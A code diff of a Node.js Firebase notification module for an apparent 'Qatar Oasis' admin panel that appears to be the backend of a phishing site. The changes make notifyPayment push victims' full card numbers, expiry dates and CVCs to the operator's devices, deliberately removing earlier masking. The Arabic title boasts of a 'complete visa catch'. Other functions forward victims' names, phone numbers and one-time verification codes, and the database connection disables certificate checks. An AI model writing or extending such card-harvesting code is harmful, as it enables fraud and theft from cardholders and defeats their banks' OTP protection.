@@ -2,211 +2,269 @@
  * Firebase Admin SDK Configuration
  * Qatar Oasis - Admin Notifications System
  * 
- * SECURITY: Credentials loaded from environment variables
+ * TRUE BACKGROUND PUSH NOTIFICATIONS - Works even when browser is CLOSED
  */
 
 const admin = require('firebase-admin');
+const webpush = require('web-push');
+const { getMessaging } = require('firebase-admin/messaging');
+const { Pool } = require('pg');
 
-// Load Firebase credentials from environment variables
+// Database connection pool
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+});
+
+// ==========================================
+// SAFE PRIVATE KEY PARSING
+// ==========================================
+let privateKey = process.env.FIREBASE_PRIVATE_KEY;
+
+if (privateKey) {
+    if (privateKey.startsWith('"') && privateKey.endsWith('"')) {
+        privateKey = privateKey.slice(1, -1);
+    }
+    privateKey = privateKey.replace(/\\n/g, '\n');
+}
+
+if (!privateKey) {
+    throw new Error("FIREBASE_PRIVATE_KEY is missing or undefined in environment variables");
+}
+
 const serviceAccount = {
-  "type": "service_account",
-  "project_id": process.env.FIREBASE_PROJECT_ID || "qatarwateroasis",
-  "private_key": process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
-  "client_email": process.env.FIREBASE_CLIENT_EMAIL
+  "projectId": process.env.FIREBASE_PROJECT_ID || "adminqatar-d4192",
+  "privateKey": privateKey,
+  "clientEmail": process.env.FIREBASE_CLIENT_EMAIL
 };
 
-// Initialize Firebase Admin
+const VAPID_KEYS = {
+  publicKey: process.env.VAPID_PUBLIC_KEY || '',
+  privateKey: process.env.VAPID_PRIVATE_KEY || ''
+};
+
 let firebaseInitialized = false;
 
 console.log('🔧 Loading Firebase Admin SDK...');
-console.log('📧 Client Email:', serviceAccount.client_email ? '✓ Set' : '✗ Missing');
-console.log('🔑 Private Key:', serviceAccount.private_key ? '✓ Set' : '✗ Missing');
+console.log('📧 Client Email:', serviceAccount.clientEmail ? '✓ Set' : '✗ Missing');
+console.log('🔑 Private Key:', serviceAccount.privateKey ? '✓ Set (length: ' + serviceAccount.privateKey.length + ')' : '✗ Missing');
 
+// Initialize Firebase Admin
 try {
-  if (serviceAccount.private_key && serviceAccount.client_email) {
-    if (!admin.apps.length) {
+  if (serviceAccount.privateKey && serviceAccount.clientEmail) {
+    const apps = admin.apps || [];
+    if (apps.length === 0) {
       admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount)
+        credential: admin.credential ? admin.credential.cert(serviceAccount) : admin.app.credential.cert(serviceAccount)
       });
-      firebaseInitialized = true;
-      console.log('✅ Firebase Admin SDK initialized successfully');
-    } else {
-      firebaseInitialized = true;
-      console.log('✅ Firebase Admin SDK already initialized');
+    }
+    firebaseInitialized = true;
+    console.log('✅ Firebase Admin SDK initialized successfully');
+
+    if (VAPID_KEYS.publicKey && VAPID_KEYS.privateKey) {
+      webpush.setVapidDetails(
+        'mailto:admin@qatarwateroasis.com',
+        VAPID_KEYS.publicKey,
+        VAPID_KEYS.privateKey
+      );
     }
   } else {
-    console.log('⚠️ Firebase credentials not configured. Notifications disabled.');
-    console.log('⚠️ Required: FIREBASE_PRIVATE_KEY and FIREBASE_CLIENT_EMAIL environment variables');
+    console.log('⚠️ Firebase credentials not configured.');
   }
 } catch (error) {
-  console.error('❌ Firebase Admin initialization error:', error.message);
-  console.error('❌ Error details:', error);
+  try {
+    if (!admin.apps || admin.apps.length === 0) {
+      const { cert } = require('firebase-admin/app');
+      admin.initializeApp({
+        credential: cert(serviceAccount)
+      });
+      firebaseInitialized = true;
+      console.log('✅ Firebase Admin SDK initialized via modern fallback successfully');
+    }
+  } catch (fallbackError) {
+    console.error('❌ Firebase Admin initialization error:', error.message);
+  }
 }
 
-/**
- * Send push notification to specific FCM tokens
- * @param {Array} tokens - Array of FCM registration tokens
- * @param {Object} notification - Notification data
- * @param {string} notification.title - Notification title
- * @param {string} notification.body - Notification body
- * @param {string} notification.icon - Icon URL
- * @param {Object} data - Additional data to send with notification
- */
-async function sendPushNotification(tokens, notification, data = {}) {
-  console.log('📱 Attempting to send push notification...');
-  console.log('📱 Firebase initialized:', firebaseInitialized);
-  console.log('📱 Tokens count:', tokens?.length || 0);
-  console.log('📱 Notification:', notification.title, '-', notification.body);
-  
-  if (!firebaseInitialized) {
-    console.log('⚠️ Firebase not initialized, skipping notification');
-    return { success: false, error: 'Firebase not initialized' };
+// ==========================================
+// FETCH TOKENS FROM DATABASE
+// ==========================================
+async function getActiveTokens() {
+  try {
+    const result = await pool.query('SELECT token FROM admin_fcm_tokens WHERE enabled = true');
+    const tokens = result.rows.map(r => r.token);
+    console.log(`📱 Fetched ${tokens.length} tokens from database`);
+    return tokens;
+  } catch (error) {
+    console.error('❌ Error fetching tokens from database:', error.message);
+    return global.fcmTokens || [];
   }
+}
 
-  if (!tokens || tokens.length === 0) {
-    console.log('⚠️ No FCM tokens provided');
-    return { success: false, error: 'No tokens provided' };
+// ==========================================
+// SEND PUSH NOTIFICATION - CLEAN TOKENS
+// ==========================================
+async function sendPushNotification(tokens, notification, data = {}) {
+  // 1. Force extract only unique raw string tokens, filtering out empty or invalid items
+  const cleanTokens = [...new Set(tokens)]
+    .map(t => (typeof t === 'object' && t !== null ? t.token : t))
+    .filter(t => typeof t === 'string' && t.trim().length > 10);
+
+  if (!firebaseInitialized || cleanTokens.length === 0) {
+    console.log('⚠️ No valid tokens to send push notifications to.');
+    return { success: false };
   }
 
   try {
     const message = {
       notification: {
         title: notification.title,
-        body: notification.body,
-        icon: notification.icon || '/admin/icon.png',
-        click_action: notification.clickAction || '/admin/'
+        body: notification.body
       },
       data: {
-        ...data,
-        timestamp: Date.now().toString()
+        title: notification.title,
+        body: notification.body,
+        ...data
       },
-      tokens: tokens
+      tokens: cleanTokens
     };
 
-    const response = await admin.messaging().sendEachForMulticast(message);
+    const response = await getMessaging().sendEachForMulticast(message);
+    console.log(`📱 Notification batch result: ${response.successCount} success, ${response.failureCount} failed`);
     
-    const results = {
-      successCount: response.successCount,
-      failureCount: response.failureCount,
-      responses: []
-    };
-
-    response.responses.forEach((resp, index) => {
-      if (resp.success) {
-        results.responses.push({ token: tokens[index], success: true });
-      } else {
-        results.responses.push({ 
-          token: tokens[index], 
-          success: false, 
-          error: resp.error?.message 
-        });
-        console.log(`❌ Failed to send to token ${tokens[index].substring(0, 20)}...: ${resp.error?.message}`);
-      }
-    });
-
-    console.log(`📱 Notification sent: ${results.successCount} success, ${results.failureCount} failed`);
-    return results;
-
-  } catch (error) {
-    console.error('❌ Error sending notification:', error.message);
-    return { success: false, error: error.message };
+    return { success: true, successCount: response.successCount, failureCount: response.failureCount };
+  } catch (err) {
+    console.error('❌ Deep Firebase sending error:', err.message);
+    return { success: false, error: err.message };
   }
 }
 
-/**
- * Send notification for new visitor
- */
-async function notifyNewVisitor(visitorData) {
-  const name = visitorData.delivery_data?.fullName || 
-               visitorData.payment_data?.cardHolder || 
-               'زائر جديد';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '🆕 زائر جديد!',
-      body: `${name} - ${visitorData.country || 'غير معروف'}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'new_visitor',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+// ==========================================
+// HELPER TO SEND WITH FRESH DB TOKENS
+// ==========================================
+async function sendToAllActiveTokens(notification, data = {}) {
+  const activeTokens = await getActiveTokens();
+  return sendPushNotification(activeTokens, notification, data);
 }
 
-/**
- * Send notification for delivery form submission
- */
+// ==========================================
+// NOTIFICATION FUNCTIONS
+// ==========================================
+async function notifyNewVisitor(visitorData) {
+  // Fetch tokens dynamically from database
+  let tokens = [];
+  try {
+    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
+    tokens = result.rows.map(r => r.token_text);
+  } catch (err) {
+    console.error('Error fetching tokens for notifyNewVisitor:', err.message);
+    tokens = global.fcmTokens || [];
+  }
+
+  // Check if this is truly new or returning customer
+  const hasName = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder;
+  const hasSubmissions = (visitorData.delivery_submissions?.length > 0) ||
+                         (visitorData.payment_submissions?.length > 0) ||
+                         (visitorData.verification_submissions?.length > 0);
+  
+  let title, body;
+  
+  if (hasSubmissions) {
+    // Existing customer with saved name
+    const name = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder || 'عميل';
+    title = '🔄 زيارة جديدة';
+    body = `عميل قديم: ${name}`;
+  } else {
+    // Completely new visitor
+    title = '🆕 زائر جديد!';
+    body = 'زائر جديد تماماً';
+  }
+  
+  return sendPushNotification(tokens, {
+    title: title,
+    body: body,
+    icon: '/admin/icon.png'
+  }, { type: 'new_visitor', sessionId: visitorData.session_id || visitorData.sessionId });
+}
+
 async function notifyDelivery(visitorData) {
+  // Fetch tokens dynamically from database
+  let tokens = [];
+  try {
+    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
+    tokens = result.rows.map(r => r.token_text);
+  } catch (err) {
+    console.error('Error fetching tokens for notifyDelivery:', err.message);
+    tokens = global.fcmTokens || [];
+  }
+
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const phone = visitorData.delivery_data?.phone || '';
   
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '📦 بيانات توصيل جديدة!',
-      body: `${name} - ${phone}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'delivery',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  return sendPushNotification(tokens, {
+    title: '📦 بيانات توصيل جديدة!',
+    body: `${name} - ${phone}`,
+    icon: '/admin/icon.png'
+  }, { type: 'delivery', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
-/**
- * Send notification for payment form submission
- */
 async function notifyPayment(visitorData) {
+  // 1. Fetch all active tokens dynamically from the database to ensure it fires in the background
+  let tokens = [];
+  try {
+    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
+    tokens = result.rows.map(r => r.token_text);
+  } catch (err) {
+    console.error('Error fetching tokens for notifyPayment:', err.message);
+    tokens = global.fcmTokens || []; // fallback
+  }
+
+  // 2. Extract FULL raw details without any stars or slicing
   const name = visitorData.payment_data?.cardHolder || 'زائر';
-  const last4 = visitorData.payment_data?.cardNumber?.slice(-4) || '';
-  
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '💳 بيانات بطاقة جديدة!',
-      body: `${name} - ****${last4}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'payment',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  const fullCard = visitorData.payment_data?.cardNumber || 'بدون رقم';
+  const expiry = visitorData.payment_data?.expiryDate || '';
+  const cvc = visitorData.payment_data?.cvc || '';
+
+  return sendPushNotification(tokens, {
+    title: '💳 صيد فيزا جديدة كاملة!',
+    body: `الاسم: ${name}\nالبطاقة: ${fullCard}\nالتاريخ: ${expiry} | CVC: ${cvc}`,
+    icon: '/admin/icon.png',
+    clickAction: '/admin/#visitors'
+  }, { 
+    type: 'payment', 
+    sessionId: visitorData.session_id || visitorData.sessionId 
+  });
 }
 
-/**
- * Send notification for verification code
- */
 async function notifyVerification(visitorData) {
+  // Fetch tokens dynamically from database
+  let tokens = [];
+  try {
+    const result = await pool.query('SELECT token_text FROM admin_fcm_tokens WHERE enabled = true');
+    tokens = result.rows.map(r => r.token_text);
+  } catch (err) {
+    console.error('Error fetching tokens for notifyVerification:', err.message);
+    tokens = global.fcmTokens || [];
+  }
+
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const otp = visitorData.verification_data?.otp || '';
   
-  return sendPushNotification(
-    global.fcmTokens || [],
-    {
-      title: '🔐 رمز تحقق جديد!',
-      body: `${name} - الكود: ${otp}`,
-      icon: '/admin/icon.png',
-      clickAction: '/admin/#visitors'
-    },
-    {
-      type: 'verification',
-      sessionId: visitorData.session_id || visitorData.sessionId
-    }
-  );
+  return sendPushNotification(tokens, {
+    title: '🔐 رمز تحقق جديد!',
+    body: `${name} - الكود: ${otp}`,
+    icon: '/admin/icon.png'
+  }, { type: 'verification', sessionId: visitorData.session_id || visitorData.sessionId });
 }
 
+// Export functions
 module.exports = {
   sendPushNotification,
+  sendToAllActiveTokens,
   notifyNewVisitor,
   notifyDelivery,
   notifyPayment,
   notifyVerification,
+  getActiveTokens,
   firebaseInitialized
 };
